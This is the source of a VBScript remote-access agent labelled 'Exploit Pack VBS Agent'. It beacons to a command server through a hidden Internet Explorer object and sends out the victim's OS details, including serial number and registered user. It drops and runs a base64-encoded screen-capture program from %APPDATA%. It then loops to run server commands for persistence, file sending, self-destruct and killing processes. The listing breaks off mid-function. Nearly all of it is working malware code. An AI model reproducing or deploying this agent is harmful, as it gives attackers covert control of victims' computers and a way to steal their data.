'Exploit Pack VBS Agent code + Web IE Object - Juan Sacco <jsacco@exploitpack.com>
' v2 Sept 24 2022
'Define basic variables
Set wshNetwork = CreateObject( "WScript.Network" )
AgentUN = "jsacco"
hostname = "172.16.197.1"
urlServer = "http://"&hostname&":8000/agent/&"
remoteIPService = "http://checkip.amazonaws.com/&"
CookieID = wshNetwork.ComputerName
runThis = ""
sendHostUrl = GetIPAddress
sendOSType = GetOS
SendMagic CookieID,sendHostUrl,"Explorer Object + VBS",sendOSType,"Waiting for commands..",AgentUN, GetIPAddress
MyCurrentIP = GetRemoteIP

' List Operating System Properties
screenshot = "Ly8gMj5udWx8fEBnb3RvIDpiYXRjaAovKgo6YmF0Y2gKQGVjaG8gb2ZmCnNldGxvY2FsCgo6OiBmaW5kIGNzYy5leGUKc2V0ICJjc2M9Igpmb3IgL3IgIiVTeXN0ZW1Sb290JVxNaWNyb3NvZnQuTkVUXEZyYW1ld29ya1wiICUlIyBpbiAoIipjc2MuZXhlIikgZG8gIHNldCAiY3NjPSUlIyIKCmlmIG5vdCBleGlzdCAiJWNzYyUiICgKICAgZWNobyBubyAubmV0IGZyYW1ld29yayBpbnN0YWxsZWQKICAgZXhpdCAvYiAxMAopCgppZiBub3QgZXhpc3QgIiV+bjAuZXhlIiAoCiAgIGNhbGwgJWNzYyUgL25vbG9nbyAvcjoiTWljcm9zb2Z0LlZpc3VhbEJhc2ljLmRsbCIgL291dDoiJX5uMC5leGUiICIlfmRwc2ZueDAiIHx8ICgKICAgICAgZXhpdCAvYiAlZXJyb3JsZXZlbCUgCiAgICkKKQolfm4wLmV4ZSAlKgplbmRsb2NhbCAmIGV4aXQgL2IgJWVycm9ybGV2ZWwlCgoqLwoKLy8gcmVmZXJlbmNlICAKLy8gaHR0cHM6Ly9nYWxsZXJ5LnRlY2huZXQubWljcm9zb2Z0LmNvbS9zY3JpcHRjZW50ZXIvZWVmZjU0NGEtZjY5MC00ZjZiLWE1ODYtMTFlZWE2ZmM1ZWI4Cgp1c2luZyBTeXN0ZW07CnVzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlczsKdXNpbmcgU3lzdGVtLkRyYXdpbmc7CnVzaW5nIFN5c3RlbS5EcmF3aW5nLkltYWdpbmc7CnVzaW5nIFN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljOwp1c2luZyBNaWNyb3NvZnQuVmlzdWFsQmFzaWM7CgoKLy8vIFByb3ZpZGVzIGZ1bmN0aW9ucyB0byBjYXB0dXJlIHRoZSBlbnRpcmUgc2NyZWVuLCBvciBhIHBhcnRpY3VsYXIgd2luZG93LCBhbmQgc2F2ZSBpdCB0byBhIGZpbGUuIAoKcHVibGljIGNsYXNzIFNjcmVlbkNhcHR1cmUKewoKICAgIC8vLyBDcmVhdGVzIGFuIEltYWdlIG9iamVjdCBjb250YWluaW5nIGEgc2NyZWVuIHNob3QgdGhlIGFjdGl2ZSB3aW5kb3cgCgogICAgcHVibGljIEltYWdlIENhcHR1cmVBY3RpdmVXaW5kb3coKQogICAgewogICAgICAgIHJldHVybiBDYXB0dXJlV2luZG93KFVzZXIzMi5HZXRGb3JlZ3JvdW5kV2luZG93KCkpOwogICAgfQoKICAgIC8vLyBDcmVhdGVzIGFuIEltYWdlIG9iamVjdCBjb250YWluaW5nIGEgc2NyZWVuIHNob3Qgb2YgdGhlIGVudGlyZSBkZXNrdG9wIAoKICAgIHB1YmxpYyBJbWFnZSBDYXB0dXJlU2NyZWVuKCkKICAgIHsKICAgICAgICByZXR1cm4gQ2FwdHVyZVdpbmRvdyhVc2VyMzIuR2V0RGVza3RvcFdpbmRvdygpKTsKICAgIH0KCiAgICAvLy8gQ3JlYXRlcyBhbiBJbWFnZSBvYmplY3QgY29udGFpbmluZyBhIHNjcmVlbiBzaG90IG9mIGEgc3BlY2lmaWMgd2luZG93IAoKICAgIHByaXZhdGUgSW1hZ2UgQ2FwdHVyZVdpbmRvdyhJbnRQdHIgaGFuZGxlKQogICAgewogICAgICAgIC8vIGdldCB0ZSBoREMgb2YgdGhlIHRhcmdldCB3aW5kb3cgCiAgICAgICAgSW50UHRyIGhkY1NyYyA9IFVzZXIzMi5HZXRXaW5kb3dEQyhoYW5kbGUpOwogICAgICAgIC8vIGdldCB0aGUgc2l6ZSAKICAgICAgICBVc2VyMzIuUkVDVCB3aW5kb3dSZWN0ID0gbmV3IFVzZXIzMi5SRUNUKCk7CiAgICAgICAgVXNlcjMyLkdldFdpbmRvd1JlY3QoaGFuZGxlLCByZWYgd2luZG93UmVjdCk7CiAgICAgICAgaW50IHdpZHRoID0gd2luZG93UmVjdC5yaWdodCAtIHdpbmRvd1JlY3QubGVmdDsKICAgICAgICBpbnQgaGVpZ2h0ID0gd2luZG93UmVjdC5ib3R0b20gLSB3aW5kb3dSZWN0LnRvcDsKICAgICAgICAvLyBjcmVhdGUgYSBkZXZpY2UgY29udGV4dCB3ZSBjYW4gY29weSB0byAKICAgICAgICBJbnRQdHIgaGRjRGVzdCA9IEdESTMyLkNyZWF0ZUNvbXBhdGlibGVEQyhoZGNTcmMpOwogICAgICAgIC8vIGNyZWF0ZSBhIGJpdG1hcCB3ZSBjYW4gY29weSBpdCB0bywgCiAgICAgICAgLy8gdXNpbmcgR2V0RGV2aWNlQ2FwcyB0byBnZXQgdGhlIHdpZHRoL2hlaWdodCAKICAgICAgICBJbnRQdHIgaEJpdG1hcCA9IEdESTMyLkNyZWF0ZUNvbXBhdGlibGVCaXRtYXAoaGRjU3JjLCB3aWR0aCwgaGVpZ2h0KTsKICAgICAgICAvLyBzZWxlY3QgdGhlIGJpdG1hcCBvYmplY3QgCiAgICAgICAgSW50UHRyIGhPbGQgPSBHREkzMi5TZWxlY3RPYmplY3QoaGRjRGVzdCwgaEJpdG1hcCk7CiAgICAgICAgLy8gYml0Ymx0IG92ZXIgCiAgICAgICAgR0RJMzIuQml0Qmx0KGhkY0Rlc3QsIDAsIDAsIHdpZHRoLCBoZWlnaHQsIGhkY1NyYywgMCwgMCwgR0RJMzIuU1JDQ09QWSk7CiAgICAgICAgLy8gcmVzdG9yZSBzZWxlY3Rpb24gCiAgICAgICAgR0RJMzIuU2VsZWN0T2JqZWN0KGhkY0Rlc3QsIGhPbGQpOwogICAgICAgIC8vIGNsZWFuIHVwIAogICAgICAgIEdESTMyLkRlbGV0ZURDKGhkY0Rlc3QpOwogICAgICAgIFVzZXIzMi5SZWxlYXNlREMoaGFuZGxlLCBoZGNTcmMpOwogICAgICAgIC8vIGdldCBhIC5ORVQgaW1hZ2Ugb2JqZWN0IGZvciBpdCAKICAgICAgICBJbWFnZSBpbWcgPSBJbWFnZS5Gcm9tSGJpdG1hcChoQml0bWFwKTsKICAgICAgICAvLyBmcmVlIHVwIHRoZSBCaXRtYXAgb2JqZWN0IAogICAgICAgIEdESTMyLkRlbGV0ZU9iamVjdChoQml0bWFwKTsKICAgICAgICByZXR1cm4gaW1nOwogICAgfQoKICAgIHB1YmxpYyB2b2lkIENhcHR1cmVBY3RpdmVXaW5kb3dUb0ZpbGUoc3RyaW5nIGZpbGVuYW1lLCBJbWFnZUZvcm1hdCBmb3JtYXQpCiAgICB7CiAgICAgICAgSW1hZ2UgaW1nID0gQ2FwdHVyZUFjdGl2ZVdpbmRvdygpOwogICAgICAgIGltZy5TYXZlKGZpbGVuYW1lLCBmb3JtYXQpOwogICAgfQoKICAgIHB1YmxpYyB2b2lkIENhcHR1cmVTY3JlZW5Ub0ZpbGUoc3RyaW5nIGZpbGVuYW1lLCBJbWFnZUZvcm1hdCBmb3JtYXQpCiAgICB7CiAgICAgICAgSW1hZ2UgaW1nID0gQ2FwdHVyZVNjcmVlbigpOwogICAgICAgIGltZy5TYXZlKGZpbGVuYW1lLCBmb3JtYXQpOwogICAgfQoKICAgIHN0YXRpYyBib29sIGZ1bGxzY3JlZW4gPSB0cnVlOwogICAgc3RhdGljIFN0cmluZyBmaWxlID0gInNjcmVlbnNob3QuYm1wIjsKICAgIHN0YXRpYyBTeXN0ZW0uRHJhd2luZy5JbWFnaW5nLkltYWdlRm9ybWF0IGZvcm1hdCA9IFN5c3RlbS5EcmF3aW5nLkltYWdpbmcuSW1hZ2VGb3JtYXQuQm1wOwogICAgc3RhdGljIFN0cmluZyB3aW5kb3dUaXRsZSA9ICIiOwoKICAgIHN0YXRpYyB2b2lkIHBhcnNlQXJndW1lbnRzKCkKICAgIHsKICAgICAgICBTdHJpbmdbXSBhcmd1bWVudHMgPSBFbnZpcm9ubWVudC5HZXRDb21tYW5kTGluZUFyZ3MoKTsKICAgICAgICBpZiAoYXJndW1lbnRzLkxlbmd0aCA9PSAxKQogICAgICAgIHsKICAgICAgICAgICAgcHJpbnRIZWxwKCk7CiAgICAgICAgICAgIEVudmlyb25tZW50LkV4aXQoMCk7CiAgICAgICAgfQogICAgICAgIGlmIChhcmd1bWVudHNbMV0uVG9Mb3dlcigpLkVxdWFscygiL2giKSB8fCBhcmd1bWVudHNbMV0uVG9Mb3dlcigpLkVxdWFscygiL2hlbHAiKSkKICAgICAgICB7CiAgICAgICAgICAgIHByaW50SGVscCgpOwogICAgICAgICAgICBFbnZpcm9ubWVudC5FeGl0KDApOwogICAgICAgIH0KCiAgICAgICAgZmlsZSA9IGFyZ3VtZW50c1sxXTsKICAgICAgICBEaWN0aW9uYXJ5PFN0cmluZywgU3lzdGVtLkRyYXdpbmcuSW1hZ2luZy5JbWFnZUZvcm1hdD4gZm9ybWF0cyA9CiAgICAgICAgbmV3IERpY3Rpb25hcnk8U3RyaW5nLCBTeXN0ZW0uRHJhd2luZy5JbWFnaW5nLkltYWdlRm9ybWF0PigpOwoKICAgICAgICBmb3JtYXRzLkFkZCgiYm1wIiwgU3lzdGVtLkRyYXdpbmcuSW1hZ2luZy5JbWFnZUZvcm1hdC5CbXApOwogICAgICAgIGZvcm1hdHMuQWRkKCJlbWYiLCBTeXN0ZW0uRHJhd2luZy5JbWFnaW5nLkltYWdlRm9ybWF0LkVtZik7CiAgICAgICAgZm9ybWF0cy5BZGQoImV4aWYiLCBTeXN0ZW0uRHJhd2luZy5JbWFnaW5nLkltYWdlRm9ybWF0LkV4aWYpOwogICAgICAgIGZvcm1hdHMuQWRkKCJqcGciLCBTeXN0ZW0uRHJhd2luZy5JbWFnaW5nLkltYWdlRm9ybWF0LkpwZWcpOwogICAgICAgIGZvcm1hdHMuQWRkKCJqcGVnIiwgU3lzdGVtLkRyYXdpbmcuSW1hZ2luZy5JbWFnZUZvcm1hdC5KcGVnKTsKICAgICAgICBmb3JtYXRzLkFkZCgiZ2lmIiwgU3lzdGVtLkRyYXdpbmcuSW1hZ2luZy5JbWFnZUZvcm1hdC5HaWYpOwogICAgICAgIGZvcm1hdHMuQWRkKCJwbmciLCBTeXN0ZW0uRHJhd2luZy5JbWFnaW5nLkltYWdlRm9ybWF0LlBuZyk7CiAgICAgICAgZm9ybWF0cy5BZGQoInRpZmYiLCBTeXN0ZW0uRHJhd2luZy5JbWFnaW5nLkltYWdlRm9ybWF0LlRpZmYpOwogICAgICAgIGZvcm1hdHMuQWRkKCJ3bWYiLCBTeXN0ZW0uRHJhd2luZy5JbWFnaW5nLkltYWdlRm9ybWF0LldtZik7CgoKICAgICAgICBTdHJpbmcgZXh0ID0gIiI7CiAgICAgICAgaWYgKGZpbGUuTGFzdEluZGV4T2YoJy4nKSA+IC0xKQogICAgICAgIHsKICAgICAgICAgICAgZXh0ID0gZmlsZS5Ub0xvd2VyKCkuU3Vic3RyaW5nKGZpbGUuTGFzdEluZGV4T2YoJy4nKSArIDEsIGZpbGUuTGVuZ3RoIC0gZmlsZS5MYXN0SW5kZXhPZignLicpIC0gMSk7CiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJJbnZhbGlkIGZpbGUgbmFtZSAtIG5vIGV4dGVuc2lvbiIpOwogICAgICAgICAgICBFbnZpcm9ubWVudC5FeGl0KDcpOwogICAgICAgIH0KCiAgICAgICAgdHJ5CiAgICAgICAgewogICAgICAgICAgICBmb3JtYXQgPSBmb3JtYXRzW2V4dF07CiAgICAgICAgfQogICAgICAgIGNhdGNoIChFeGNlcHRpb24gZSkKICAgICAgICB7CiAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJQcm9iYWJseSB3cm9uZyBmaWxlIGZvcm1hdDoiICsgZXh0KTsKICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoZS5Ub1N0cmluZygpKTsKICAgICAgICAgICAgRW52aXJvbm1lbnQuRXhpdCg4KTsKICAgICAgICB9CgoKICAgICAgICBpZiAoYXJndW1lbnRzLkxlbmd0aCA+IDIpCiAgICAgICAgewogICAgICAgICAgICB3aW5kb3dUaXRsZSA9IGFyZ3VtZW50c1syXTsKICAgICAgICAgICAgZnVsbHNjcmVlbiA9IGZhbHNlOwogICAgICAgIH0KCiAgICB9CgogICAgc3RhdGljIHZvaWQgcHJpbnRIZWxwKCkKICAgIHsKICAgICAgICAvL2NsZWFycyB0aGUgZXh0ZW5zaW9uIGZyb20gdGhlIHNjcmlwdCBuYW1lCiAgICAgICAgU3RyaW5nIHNjcmlwdE5hbWUgPSBFbnZpcm9ubWVudC5HZXRDb21tYW5kTGluZUFyZ3MoKVswXTsKICAgICAgICBzY3JpcHROYW1lID0gc2NyaXB0TmFtZS5TdWJzdHJpbmcoMCwgc2NyaXB0TmFtZS5MZW5ndGgpOwogICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKHNjcmlwdE5hbWUgKyAiIGNhcHR1cmVzIHRoZSBzY3JlZW4gb3IgdGhlIGFjdGl2ZSB3aW5kb3cgYW5kIHNhdmVzIGl0IHRvIGEgZmlsZS4iKTsKICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiIik7CiAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIlVzYWdlOiIpOwogICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCIgIiArIHNjcmlwdE5hbWUgKyAiIGZpbGVuYW1lICBbV2luZG93VGl0bGVdIik7CiAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIiIpOwogICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJmaWxlbmFtZSAtIHRoZSBmaWxlIHdoZXJlIHRoZSBzY3JlZW4gY2FwdHVyZSB3aWxsIGJlIHNhdmVkIik7CiAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIiAgICAgYWxsb3dlZCBmaWxlIGV4dGVuc2lvbnMgYXJlIC0gQm1wLEVtZixFeGlmLEdpZixJY29uLEpwZWcsUG5nLFRpZmYsV21mLiIpOwogICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJXaW5kb3dUaXRsZSAtIGluc3RlYWQgb2YgY2FwdHVyZSB3aG9sZSBzY3JlZW4geW91IGNhbiBwb2ludCB0byBhIHdpbmRvdyAiKTsKICAgICAgICBDb25zb2xlLldyaXRlTGluZSgiICAgICB3aXRoIGEgdGl0bGUgd2hpY2ggd2lsbCBwdXQgb24gZm9jdXMgYW5kIGNhcHR1dGVkLiIpOwogICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCIgICAgIEZvciBXaW5kb3dUaXRsZSB5b3UgY2FuIHBhc3Mgb25seSB0aGUgZmlyc3QgZmV3IGNoYXJhY3RlcnMuIik7CiAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIiAgICAgSWYgZG9uJ3Qgd2FudCB0byBjaGFuZ2UgdGhlIGN1cnJlbnQgYWN0aXZlIHdpbmRvdyBwYXNzIG9ubHkgXCJcIiIpOwogICAgfQoKICAgIHB1YmxpYyBzdGF0aWMgdm9pZCBNYWluKCkKICAgIHsKICAgICAgICBVc2VyMzIuU2V0UHJvY2Vzc0RQSUF3YXJlKCk7CiAgICAgICAgCiAgICAgICAgcGFyc2VBcmd1bWVudHMoKTsKICAgICAgICBTY3JlZW5DYXB0dXJlIHNjID0gbmV3IFNjcmVlbkNhcHR1cmUoKTsKICAgICAgICBpZiAoIWZ1bGxzY3JlZW4gJiYgIXdpbmRvd1RpdGxlLkVxdWFscygiIikpCiAgICAgICAgewogICAgICAgICAgICB0cnkKICAgICAgICAgICAgewoKICAgICAgICAgICAgICAgIEludGVyYWN0aW9uLkFwcEFjdGl2YXRlKHdpbmRvd1RpdGxlKTsKICAgICAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJzZXR0aW5nICIgKyB3aW5kb3dUaXRsZSArICIgb24gZm9jdXMiKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaCAoRXhjZXB0aW9uIGUpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJQcm9iYWJseSB0aGVyZSdzIG5vIHdpbmRvdyBsaWtlICIgKyB3aW5kb3dUaXRsZSk7CiAgICAgICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZShlLlRvU3RyaW5nKCkpOwogICAgICAgICAgICAgICAgRW52aXJvbm1lbnQuRXhpdCg5KTsKICAgICAgICAgICAgfQoKCiAgICAgICAgfQogICAgICAgIHRyeQogICAgICAgIHsKICAgICAgICAgICAgaWYgKGZ1bGxzY3JlZW4pCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJUYWtpbmcgYSBjYXB0dXJlIG9mIHRoZSB3aG9sZSBzY3JlZW4gdG8gIiArIGZpbGUpOwogICAgICAgICAgICAgICAgc2MuQ2FwdHVyZVNjcmVlblRvRmlsZShmaWxlLCBmb3JtYXQpOwogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIlRha2luZyBhIGNhcHR1cmUgb2YgdGhlIGFjdGl2ZSB3aW5kb3cgdG8gIiArIGZpbGUpOwogICAgICAgICAgICAgICAgc2MuQ2FwdHVyZUFjdGl2ZVdpbmRvd1RvRmlsZShmaWxlLCBmb3JtYXQpOwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGNhdGNoIChFeGNlcHRpb24gZSkKICAgICAgICB7CiAgICAgICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKCJDaGVjayBpZiBmaWxlIHBhdGggaXMgdmFsaWQgIiArIGZpbGUpOwogICAgICAgICAgICBDb25zb2xlLldyaXRlTGluZShlLlRvU3RyaW5nKCkpOwogICAgICAgIH0KICAgIH0KCiAgICAvLy8gSGVscGVyIGNsYXNzIGNvbnRhaW5pbmcgR2RpMzIgQVBJIGZ1bmN0aW9ucyAKCiAgICBwcml2YXRlIGNsYXNzIEdESTMyCiAgICB7CgogICAgICAgIHB1YmxpYyBjb25zdCBpbnQgU1JDQ09QWSA9IDB4MDBDQzAwMjA7IC8vIEJpdEJsdCBkd1JvcCBwYXJhbWV0ZXIgCiAgICAgICAgW0RsbEltcG9ydCgiZ2RpMzIuZGxsIildCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBCaXRCbHQoSW50UHRyIGhPYmplY3QsIGludCBuWERlc3QsIGludCBuWURlc3QsCiAgICAgICAgICBpbnQgbldpZHRoLCBpbnQgbkhlaWdodCwgSW50UHRyIGhPYmplY3RTb3VyY2UsCiAgICAgICAgICBpbnQgblhTcmMsIGludCBuWVNyYywgaW50IGR3Um9wKTsKICAgICAgICBbRGxsSW1wb3J0KCJnZGkzMi5kbGwiKV0KICAgICAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgQ3JlYXRlQ29tcGF0aWJsZUJpdG1hcChJbnRQdHIgaERDLCBpbnQgbldpZHRoLAogICAgICAgICAgaW50IG5IZWlnaHQpOwogICAgICAgIFtEbGxJbXBvcnQoImdkaTMyLmRsbCIpXQogICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBDcmVhdGVDb21wYXRpYmxlREMoSW50UHRyIGhEQyk7CiAgICAgICAgW0RsbEltcG9ydCgiZ2RpMzIuZGxsIildCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gYm9vbCBEZWxldGVEQyhJbnRQdHIgaERDKTsKICAgICAgICBbRGxsSW1wb3J0KCJnZGkzMi5kbGwiKV0KICAgICAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBib29sIERlbGV0ZU9iamVjdChJbnRQdHIgaE9iamVjdCk7CiAgICAgICAgW0RsbEltcG9ydCgiZ2RpMzIuZGxsIildCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIFNlbGVjdE9iamVjdChJbnRQdHIgaERDLCBJbnRQdHIgaE9iamVjdCk7CiAgICB9CgoKICAgIC8vLyBIZWxwZXIgY2xhc3MgY29udGFpbmluZyBVc2VyMzIgQVBJIGZ1bmN0aW9ucyAKCiAgICBwcml2YXRlIGNsYXNzIFVzZXIzMgogICAgewogICAgICAgIFtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsKV0KICAgICAgICBwdWJsaWMgc3RydWN0IFJFQ1QKICAgICAgICB7CiAgICAgICAgICAgIHB1YmxpYyBpbnQgbGVmdDsKICAgICAgICAgICAgcHVibGljIGludCB0b3A7CiAgICAgICAgICAgIHB1YmxpYyBpbnQgcmlnaHQ7CiAgICAgICAgICAgIHB1YmxpYyBpbnQgYm90dG9tOwogICAgICAgIH0KICAgICAgICBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIildCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIEdldERlc2t0b3BXaW5kb3coKTsKICAgICAgICBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIildCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIEdldFdpbmRvd0RDKEludFB0ciBoV25kKTsKICAgICAgICBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIildCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIFJlbGVhc2VEQyhJbnRQdHIgaFduZCwgSW50UHRyIGhEQyk7CiAgICAgICAgW0RsbEltcG9ydCgidXNlcjMyLmRsbCIpXQogICAgICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRXaW5kb3dSZWN0KEludFB0ciBoV25kLCByZWYgUkVDVCByZWN0KTsKICAgICAgICBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIildCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gSW50UHRyIEdldEZvcmVncm91bmRXaW5kb3coKTsKICAgICAgICBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIildCiAgICAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gaW50IFNldFByb2Nlc3NEUElBd2FyZSgpOwogICAgfQp9"

Set dtmConvertedDate = CreateObject("WbemScripting.SWbemDateTime")

strComputer = "."
Set objWMIService = GetObject("winmgmts:" _
    & "{impersonationLevel=impersonate}!\\" & strComputer & "\root\cimv2")

Set colOperatingSystems = objWMIService.ExecQuery _
    ("Select * from Win32_OperatingSystem")

Dim objShell
Set objShell = Wscript.CreateObject("WScript.Shell")

For Each objOperatingSystem in colOperatingSystems
	SendMagic CookieID,sendHostUrl,"Explorer Object + VBS",sendOSType,"Microsoft Windows ["& objOperatingSystem.Version &"]",AgentUN, GetIPAddress
	SendMagic CookieID,sendHostUrl,"Explorer Object + VBS",sendOSType,"(c) 2019 Microsoft Corporation. All rights reserved.",AgentUN, GetIPAddress
	SendMagic CookieID,sendHostUrl,"Explorer Object + VBS",sendOSType,"Boot Device: " & objOperatingSystem.BootDevice,AgentUN, GetIPAddress
	SendMagic CookieID,sendHostUrl,"Explorer Object + VBS",sendOSType,"Build Number: " & objOperatingSystem.BuildNumber,AgentUN, GetIPAddress
	SendMagic CookieID,sendHostUrl,"Explorer Object + VBS",sendOSType,"Build Type: " & objOperatingSystem.BuildType,AgentUN, GetIPAddress
	SendMagic CookieID,sendHostUrl,"Explorer Object + VBS",sendOSType,"Caption: " & objOperatingSystem.Caption,AgentUN, GetIPAddress
	SendMagic CookieID,sendHostUrl,"Explorer Object + VBS",sendOSType,"Code Set: " & objOperatingSystem.CodeSet,AgentUN, GetIPAddress
	SendMagic CookieID,sendHostUrl,"Explorer Object + VBS",sendOSType,"Country Code: " & objOperatingSystem.CountryCode,AgentUN, GetIPAddress
	SendMagic CookieID,sendHostUrl,"Explorer Object + VBS",sendOSType,"Debug: " & objOperatingSystem.Debug,AgentUN, GetIPAddress
	SendMagic CookieID,sendHostUrl,"Explorer Object + VBS",sendOSType,"Encryption Level: " & objOperatingSystem.EncryptionLevel,AgentUN, GetIPAddress
	    dtmConvertedDate.Value = objOperatingSystem.InstallDate
	    dtmInstallDate = dtmConvertedDate.GetVarDate
	SendMagic CookieID,sendHostUrl,"Explorer Object + VBS",sendOSType,"Install Date: " & dtmInstallDate,AgentUN, GetIPAddress 
	SendMagic CookieID,sendHostUrl,"Explorer Object + VBS",sendOSType,"Licensed Users: " & _
	        objOperatingSystem.NumberOfLicensedUsers,AgentUN, GetIPAddress
	SendMagic CookieID,sendHostUrl,"Explorer Object + VBS",sendOSType,"Organization: " & objOperatingSystem.Organization,AgentUN, GetIPAddress
	SendMagic CookieID,sendHostUrl,"Explorer Object + VBS",sendOSType,"OS Language: " & objOperatingSystem.OSLanguage,AgentUN, GetIPAddress
	SendMagic CookieID,sendHostUrl,"Explorer Object + VBS",sendOSType,"OS Product Suite: " & objOperatingSystem.OSProductSuite,AgentUN, GetIPAddress
	SendMagic CookieID,sendHostUrl,"Explorer Object + VBS",sendOSType,"OS Type: " & objOperatingSystem.OSType,AgentUN, GetIPAddress
	SendMagic CookieID,sendHostUrl,"Explorer Object + VBS",sendOSType,"Primary: " & objOperatingSystem.Primary,AgentUN, GetIPAddress
	SendMagic CookieID,sendHostUrl,"Explorer Object + VBS",sendOSType,"Registered User: " & objOperatingSystem.RegisteredUser,AgentUN, GetIPAddress
	SendMagic CookieID,sendHostUrl,"Explorer Object + VBS",sendOSType,"Version: " & objOperatingSystem.Version,AgentUN, GetIPAddress
	SendMagic CookieID,sendHostUrl,"Explorer Object + VBS",sendOSType,"Serial Number: " & objOperatingSystem.SerialNumber,AgentUN, GetIPAddress
Next

outputFile = objShell.ExpandEnvironmentStrings("%APPDATA%") & "\screenshot.bat"
Set fso = CreateObject("Scripting.FileSystemObject")
Set File = fso.CreateTextFile(outputFile,True)
File.Write Base64Decode(screenshot)
File.Close
Set oShell = CreateObject ("WScript.Shell")
Dim strPath1
strPath1 = "cmd.exe /c " & outputFile 
oShell.run strPath1,2, true	

' Repeater
Do
	WScript.Sleep 2000
	SendMagic CookieID,sendHostUrl,"Explorer Object + VBS",sendOSType,"Waiting for Exploit Pack..",AgentUN, GetIPAddress
	' Run if not empty
	If Len(runThis) > 1  Then
        Command(runThis)
    End If
Loop While True

' Connect back to Exploit Pack
Function SendMagic(CookieID,sendHostUrl,SendBrowserName,sendOSType,ResponseData,AgentUN,MyCurrentIP)
	On Error Resume Next
	Set Magic = CreateObject("InternetExplorer.Application")
	Magic.visible = 0
	'Magic.navigate urlServer & CookieID & "&" & sendHostUrl & "&" & SendBrowserName & "&" & sendOSType & "&" & ResponseData & "&1&" & AgentUN & "&" & MyCurrentIP
	Magic.navigate urlServer & Base64Encode(CookieID & "&" & sendHostUrl & "&" & SendBrowserName & "&" & sendOSType & "&" & ResponseData & "&1&" & AgentUN & "&" & MyCurrentIP, false)

	Do While Magic.Busy
	   WScript.Sleep 200  ' Prevents script host from going crazy waiting for IE
	   Exit Do                  
	Loop
	HTTPGet = Magic.document.documentelement.outerhtml
	Magic.quit
	' Call CleanInput to obtain the commands to run
	runThis = CleanInput(HTTPGet)
	Set Magic = Nothing
	On Error Goto 0 
	'MsgBox(urlServer+Base64Encode(CookieID & "&" & sendHostUrl & "&" & SendBrowserName & "&" & sendOSType & "&" & ResponseData & "&1&" & AgentUN & "&" & MyCurrentIP, true))
	'MsgBox(urlServer+ CookieID & "&" & sendHostUrl & "&" & SendBrowserName & "&" & sendOSType & "&" & ResponseData & "&1&" & AgentUN & "&" & MyCurrentIP)
End Function

Function Command(run)
	On Error Resume Next
	If Instr(runThis, "killagent") = 1 Then
	    WScript.Sleep 1000
		SendMagic CookieID,sendHostUrl,"Explorer Object + VBS",sendOSType,"Agent killed from client host",AgentUN, GetIPAddress
		Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
		    Set colItems = objWMIService.ExecQuery("Select * From Win32_Process")
		
		    For Each objItem in colItems
		        If LCase(objItem.name) = "wscript.exe" then 
		                objItem.terminate
		        End If
		    Next
			For Each objItem in colItems
		        If LCase(objItem.name) = "iexplore.exe" then 
		                objItem.terminate
		        End If
		    Next
	End If
	
	If Instr(runThis, "selfdestruct") = 1 Then
	    WScript.Sleep 1000
		SelfDestruct
		SendMagic CookieID,sendHostUrl,"Explorer Object + VBS",sendOSType,"Selfdestruct activated",AgentUN, GetIPAddress
	End If
	
	If Instr(runThis, "installer") = 1 Then
	    WScript.Sleep 1000
		CreateTask
		Persistence
		Installer
		SendMagic CookieID,sendHostUrl,"Explorer Object + VBS",sendOSType,"Installer setup for agent",AgentUN, GetIPAddress
	End If
	
	If Instr(runThis, "currentpath") = 1 Then
	    WScript.Sleep 1000
		SendMagic CookieID,sendHostUrl,"Explorer Object + VBS",sendOSType,ScriptLocation,AgentUN, GetIPAddress
	End If
	
	If Instr(runThis, "SendFile") = 1 Then
	    WScript.Sleep 1000
		SendFile
